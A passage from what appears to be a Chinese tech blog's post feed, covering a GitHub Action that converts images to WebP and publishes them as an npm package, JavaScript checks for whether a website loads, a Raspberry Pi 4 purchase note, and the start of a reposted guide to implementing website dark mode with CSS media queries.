href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media 